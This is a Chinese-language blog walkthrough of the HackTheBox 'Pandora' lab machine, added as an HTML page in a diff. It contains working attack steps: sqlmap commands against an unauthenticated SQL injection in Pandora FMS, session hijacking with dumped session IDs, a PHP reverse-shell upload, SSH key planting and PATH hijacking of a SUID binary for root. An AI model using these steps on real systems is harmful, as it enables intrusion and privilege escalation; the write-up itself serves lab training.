@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>HackTheBox：Pandora靶场 - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="HackTheBox：Pandora靶场" />
+<meta property="og:description" content="HackTheBox：Pandora靶场 这个靶场是一台linux机器，上边搭载了两个cms，其中涉及到对信息搜集、ssh证书登录、suid提权、sql注入等知识的考验
+信息搜集 nmap走一遍什么也没
+┌──(root㉿kali)-[~]
+└─# nmap -sS -sV -Pn 10.10.11.136
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 21:18 CST
+Nmap scan report for 10.10.11.136
+Host is up (1.8s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+没办法，whatweb看看cms
+说可能是WordPress，但是wpscan扫了结果并不是，目录扫描也没结果，只跑出来一个assets目录
+做到这里，显然htb没有把突破点放在前台，就是一个模拟常见网站的cms，去别的地方再看看" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/85a8a78c50564848e10af4b66a089a85/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-05-22T23:58:17+08:00" />
+<meta property="article:modified_time" content="2022-05-22T23:58:17+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">HackTheBox：Pandora靶场</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-light">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <h2><a id="HackTheBoxPandora_0"></a>HackTheBox：Pandora靶场</h2> 
+<hr> 
+<p>这个靶场是一台linux机器，上边搭载了两个cms，其中涉及到对信息搜集、ssh证书登录、suid提权、sql注入等知识的考验</p> 
+<h3><a id="_3"></a>信息搜集</h3> 
+<p>nmap走一遍什么也没</p> 
+<blockquote> 
+ <p>┌──(root㉿kali)-[~]<br> └─# nmap -sS -sV -Pn 10.10.11.136<br> Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 21:18 CST<br> Nmap scan report for 10.10.11.136<br> Host is up (1.8s latency).<br> Not shown: 998 closed tcp ports (reset)<br> PORT STATE SERVICE VERSION<br> 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br> 80/tcp open http Apache httpd 2.4.41 ((Ubuntu))<br> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p> 
+</blockquote> 
+<p>没办法，whatweb看看cms<br> <img src="https://images2.imgbox.com/ec/fa/fgH3qfR9_o.png" alt=""></p> 
+<p>说可能是WordPress，但是wpscan扫了结果并不是，目录扫描也没结果，只跑出来一个assets目录<br> <img src="https://images2.imgbox.com/a5/3e/RZOVjcy2_o.png" alt="在这里插入图片描述"></p> 
+<p>做到这里，显然htb没有把突破点放在前台，就是一个模拟常见网站的cms，去别的地方再看看</p> 
+<hr> 
+<p>按照论坛里老哥说的，信息搜集做不够，那再来一遍：</p> 
+<blockquote> 
+ <p>masscan -p1-65535,U:1-65535 10.10.10.239 --rate=1000 -e tun0</p> 
+</blockquote> 
+<p>最后找到一个UDP161端口，看看服务：</p> 
+<blockquote> 
+ <p>┌──(root㉿kali)-[~]<br> └─# nmap -sU -sV -p U:161 10.10.11.136<br> Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 17:00 CST<br> Nmap scan report for 10.10.11.136<br> Host is up (0.43s latency).<br> PORT STATE SERVICE VERSION<br> 161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)<br> Service Info: Host: pandora</p> 
+</blockquote> 
+<p>查一下，这个突破点放在这里，大概率是snmp信息泄露，直接上snmpwalk，跑了十多分钟，眼睛都看花了</p> 
+<blockquote> 
+ <p>snmpwalk -v 2c -c public 10.10.11.136<br> <img src="https://images2.imgbox.com/52/b6/SvVx2sad_o.png" alt="在这里插入图片描述"><br> 里面找到一个命令信息，使用账号密码ssh登录上去试一试：</p> 
+</blockquote> 
+<hr> 
+<h3><a id="_48"></a>进入靶机</h3> 
+<p>好家伙，水晶保险柜不给钥匙，想办法能直接提root不就行啦？<br> <img src="https://images2.imgbox.com/6b/80/Ki8SKeBy_o.png" alt="在这里插入图片描述"><br> ps -aux也没找到可以的提权进程<br> 到这里用lineas.sh跑一遍，有个CVE-2021-4034可以用，查了一下时间，靶机发布的时候还没有这个洞，那么高手肯定是不屑于走捷径滴<br> <img src="https://images2.imgbox.com/e4/79/ZCvSlrEU_o.png" alt="在这里插入图片描述"><br> 找suid</p> 
+<blockquote> 
+ <p>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</p> 
+</blockquote> 
+<p>找到一个奇怪的程序，但是以当前daniel的用户没有权限运行，因为是属于matt的文件，那看来拿到matt之后也就能拿到root了，因为suid设置失误，可以用来提权<br> <img src="https://images2.imgbox.com/bc/d9/WB0I8GIw_o.png" alt="在这里插入图片描述"></p> 
+<p>进到web目录里发现还有一个名为pandora的文件夹，然后结合lineas.sh里看到的hosts文件，应该是本地开了个网站<br> <img src="https://images2.imgbox.com/bb/ac/aEHCnZpE_o.png" alt="在这里插入图片描述"><br> 根据机子上hosts文件，在kali上调整hosts文件之后再去访问，拒绝访问，推测只能从本机、内网访问</p> 
+<blockquote> 
+ <p>Hostname, hosts and DNS<br> pandora<br> 127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb<br> 127.0.1.1 pandora</p> 
+</blockquote> 
+<blockquote> 
+ <p>10.10.11.136 pandora.htb #添加到本机/etc/hosts</p> 
+</blockquote> 
+<p>因此做个流量转发，正好靶机里有个socat，种种可能都暗示就是这样走下去！<br> 结果一顿折腾，socat不知是什么情况连接不被允许，以前只有在防火墙策略被拦过，现在没办法，只好找一条新路</p> 
+<blockquote> 
+ <p>kali本地kali本地<br> socat -d tcp-listen:9997,reuseaddr,bind=0.0.0.0,fork tcp4-listen:9996,bind=0.0.0.0,reuseaddr,retry=100<br> ssh上<br> socat -d tcp:10.10.16.16:9996,forever,intervall=0.1,fork tcp:localhost:80<br> 以上命令</p> 
+</blockquote> 
+<p>后来发觉一直用的是socks5的代理，socat似乎直接走http就行，我敲！<br> <img src="https://images2.imgbox.com/de/be/DQvseIjP_o.png" alt="在这里插入图片描述"><br> 浏览器一改，直接发现新大陆，是pandora这个cms的后台，版本742:<br> <img src="https://images2.imgbox.com/50/40/oPMo0Uiz_o.png" alt="在这里插入图片描述"><br> OK，上一个0day admin：admin跑一跑，好伐，失败，bp爆破也没法子，我宣布这个cms没有漏洞，打道回府回去其他地方提权<br> <img src="https://images2.imgbox.com/82/20/qJlIJ5do_o.png" alt="在这里插入图片描述"></p> 
+<hr> 
+<h3><a id="SQL_87"></a>SQL注入</h3> 
+<p>exploit-db上有不少pandora的利用，但是版本对不上，几个rce也是需要认证的<br> <img src="https://images2.imgbox.com/4e/4d/rz2VKKzC_o.png" alt="在这里插入图片描述"></p> 
+<p>然后在csdn上找到一个无需授权的sql注入，在/include/chart_generator.php路径下的session_id<br> CSDN yyds</p> 
+<blockquote> 
+ <p>https://blog.csdn.net/weixin_39866419/article/details/111109722</p> 
+</blockquote> 
+<p>使用sqlmap跑，最后挨个表都看看，最有用的如下所示啦</p> 
+<pre><code class="prism language-powershell">sqlmap <span class="token operator">-</span>u <span class="token string">"http://pandora.htb/pandora_console/include/chart_generator.php?session_id=''"</span> <span class="token operator">--</span>batch <span class="token operator">--</span>proxy=http:<span class="token operator">/</span><span class="token operator">/</span>127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1:9997
+sqlmap <span class="token operator">-</span>u <span class="token string">"http://pandora.htb/pandora_console/include/chart_generator.php?session_id=''"</span> <span class="token operator">--</span>batch <span class="token operator">--</span>proxy=http:<span class="token operator">/</span><span class="token operator">/</span>127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1:9997 <span class="token operator">--</span>dbms=mysql <span class="token operator">-</span>D pandora <span class="token operator">-</span>T tsessions_php <span class="token operator">-</span>C id_session<span class="token punctuation">,</span><span class="token keyword">data</span> <span class="token operator">--</span>dump
+</code></pre> 
+<blockquote> 
+ <p>id_session,data<br> 09vao3q1dikuoi1vhcvhcjjbc6,“id_usuario|s:6:”“daniel”“;”<br> 0ahul7feb1l9db7ffp8d25sjba,NULL<br> 0bsac6g2k1180bb1busbs23jbp,NULL<br> 1um23if7s531kqf5da14kf5lvm,NULL<br> 2bgo8b5bubrakf69j3bo6joekt,NULL<br> 2e25c62vc3odbppmg6pjbf9bum,NULL<br> 2l2iuv1laidcc9pj1utocl9gce,NULL<br> 346uqacafar8pipuppubqet7ut,“id_usuario|s:6:”“daniel”“;”<br> 3me2jjab4atfa5f8106iklh4fc,NULL<br> 4f51mju7kcuonuqor3876n8o02,NULL<br> 4nsbidcmgfoh1gilpv8p5hpi2s,“id_usuario|s:6:”“daniel”“;”<br> 59qae699l0971h13qmbpqahlls,NULL<br> 5fihkihbip2jioll1a8mcsmp6j,NULL<br> 5gv90lbag8e7u5f0imb5kb3gcc,NULL<br> 5i352tsdh7vlohth30ve4o0air,“id_usuario|s:6:”“daniel”“;”<br> 5rrk5b27d6gafk3m5mpo01algl,“id_usuario|s:6:”“daniel”“;”<br> 69gbnjrc2q42e8aqahb1l2s68n,“id_usuario|s:6:”“daniel”“;”<br> 81f3uet7p3esgiq02d4cjj48rc,NULL<br> 84k0cgcvcmtf9rkfk57sfc1f3p,NULL<br> 8k1f0hjgp9h1ftagql3m9nojt0,NULL<br> 8m2e6h8gmphj79r9pq497vpdre,“id_usuario|s:6:”“daniel”“;”<br> 8upeameujo9nhki3ps0fu32cgd,NULL<br> 9vv4godmdam3vsq8pu78b52em9,“id_usuario|s:6:”“daniel”“;”<br> a3a49kc938u7od6e6mlip1ej80,NULL<br> agfdiriggbt86ep71uvm1jbo3f,“id_usuario|s:6:”“daniel”“;”<br> cojb6rgubs18ipb35b3f6hf0vp,NULL<br> d0carbrks2lvmb90ergj7jv6po,NULL<br> e6ue70qse2iftr6d7dn08rgikb,NULL<br> f0qisbrojp785v1dmm8cu1vkaj,“id_usuario|s:6:”“daniel”“;”<br> fikt9p6i78no7aofn74rr71m85,NULL<br> fqd96rcv4ecuqs409n5qsleufi,NULL<br> g0kteepqaj1oep6u7msp0u38kv,“id_usuario|s:6:”“daniel”“;”<br> g4e01qdgk36mfdh90hvcc54umq,“id_usuario|s:4:”“matt”“;alert_msg|a:0:{}new_chat|b:0;”<br> g5j7vd90nh4aj4579guvp5fr3v,“id_usuario|s:5:”“admin”“;alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:”“e8a701aaafa566e594e0d9e19757be5a”“;”<br> gf40pukfdinc63nm5lkroidde6,NULL<br> heasjj8c48ikjlvsf1uhonfesv,NULL<br> hsftvg6j5m3vcmut6ln6ig8b0f,“id_usuario|s:6:”“daniel”“;”<br> iv4b5k35s79gfulfht7jm0smed,NULL<br> jecd4v8f6mlcgn4634ndfl74rd,“id_usuario|s:6:”“daniel”“;”<br> kp90bu1mlclbaenaljem590ik3,NULL<br> mdlm1omba1om2la71jsrbtjo0p,“id_usuario|s:6:”“daniel”“;”<br> ne9rt4pkqqd0aqcrr4dacbmaq3,NULL<br> o3kuq4m5t5mqv01iur63e1di58,“id_usuario|s:6:”“daniel”“;”<br> oi2r6rjq9v99qt8q9heu3nulon,“id_usuario|s:6:”“daniel”“;”<br> pakk1n0s6lrj9cjlda0h2buraj,NULL<br> pjp312be5p56vke9dnbqmnqeot,“id_usuario|s:6:”“daniel”“;”<br> qjng1r929csokvqbkujaig07u7,NULL<br> qq8gqbdkn8fks0dv1l9qk6j3q8,NULL<br> r097jr6k9s7k166vkvaj17na1u,NULL<br> rgku3s5dj4mbr85tiefv53tdoa,“id_usuario|s:6:”“daniel”“;”<br> sg21i0bclk7oea8n3osn8pi3vd,NULL<br> snp5ta5qshncnbigkiobt0ne9s,NULL<br> u5ktk2bt6ghb7s51lka5qou4r4,“id_usuario|s:6:”“daniel”“;”<br> u74bvn6gop4rl21ds325q80j0e,“id_usuario|s:6:”“daniel”“;”</p> 
+</blockquote> 
+<p>最后发觉跑出来的东西没用，不涉及账号密码，但是这个session_id起的名字也很奇怪，如果加在url后面会怎样？根据爆破出来的三个用户的id依次尝试（开两个页面，一个换id，一个直接访问pandora.htb主页），嘻嘻成功登录管理界面，要注意daniel是没法访问这个后台的，只有matt和admin的可以，并且两个账户的后台也不完全相同，可见<br> <img src="https://images2.imgbox.com/29/7b/h0Ak5RYt_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/7e/19/n0UppnAS_o.png" alt="在这里插入图片描述"></p> 
+<p>我用的是g5j7vd90nh4aj4579guvp5fr3v这个id，在admin的后台里找到了一个允许文件上传的地方，找一个php_reverseshell传上去，在ssh里找到绝对路径，然后web访问就可以回连一个shell啦！<br> <img src="https://images2.imgbox.com/9d/9e/Qifdqq7D_o.png" alt="在这里插入图片描述"><br> 接着拿到user.txt<br> <img src="https://images2.imgbox.com/38/36/zhB9zMbW_o.png" alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/3660007b1f7d4bd6bb0578044460b01d.png"></p> 
+<hr> 
+<h3><a id="root_169"></a>提权root</h3> 
+<p>这里呢获得matt的shell之后，根据先前suid看到的，可以看出这个文件会执行web网站备份，那么通过改变环境变量来执行，可以获得一个root的shell<br> <img src="https://images2.imgbox.com/60/0d/GFfa4OcV_o.png" alt="在这里插入图片描述"><br> 以为到了这一步之后就很简单了，但是事实证明我还是太年轻：</p> 
+<blockquote> 
+ <p>$ echo “/bin/bash” &gt; tar<br> $ chmod +x tar<br> $ export PATH=/home/matt:$PATH<br> $ /usr/bin/pandora_backup</p> 
+ <p>id<br> uid=1000(matt) gid=1000(matt) groups=1000(matt)<br> whoami<br> matt</p> 
+</blockquote> 
+<p>执行之后并没有返回一个shell，我仍然在原先php返回的shell里，进程列表里也显示成功利用错误路径下的tar执行了备份文件，一开始还以为网卡，执行了好几次<br> <img src="https://images2.imgbox.com/03/a0/KgDAOA2T_o.png" alt="在这里插入图片描述"><br> 猜测是nc半交互式的特点导致的shell未反弹，那么得想办法拿到一个正常的shell<br> 那么合理利用信息搜集，论坛上的老哥提到ssh可以证书登录，这才点醒了我<br> 过程我就不再赘述了，大致就是利用ssh-keygen生成ssh公私钥，然后在kali上利用这个公钥证书ssh登录，获得matt的ssh shell</p> 
+<blockquote> 
+ <p><img src="https://images2.imgbox.com/82/64/NlMNiSM4_o.png" alt="在这里插入图片描述"><br> cat id_rsa.pub &gt; authorized_keys<br> chmod 600 authorized_keys</p> 
+</blockquote> 
+<blockquote> 
+ <p>在kali上，把私钥拷贝过来写进id_rsa内<br> chmod 600 id_rsa<br> ssh matt@10.10.11.136 -i id</p> 
+</blockquote> 
+<p>成功登录上去，按照刚才做的suid来提权，终于拿下这破easy机子<br> <img src="https://images2.imgbox.com/82/d8/beSy5zd9_o.png" alt="在这里插入图片描述"></p> 
+<hr> 
+<p>没想到这台机子遇到的困难会如此之多，但是确实学到了不少，尤其是涉及到ssh登录以及交互式shell对命令执行的反馈不同<br> <img src="https://images2.imgbox.com/00/5b/gewVVU8P_o.png" alt="在这里插入图片描述"></p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/470ebff9be1e1434599385606c5c6af1/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">IDEA 一个窗口打开多个项目ideal中如何添加几个不同的项目在同一个idea页面显示（30秒解决）</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/de2fdfa9d4bf65860fad9d4f30a1f78f/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">PHP 如何根据Ip区分是国内还是国外地方</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
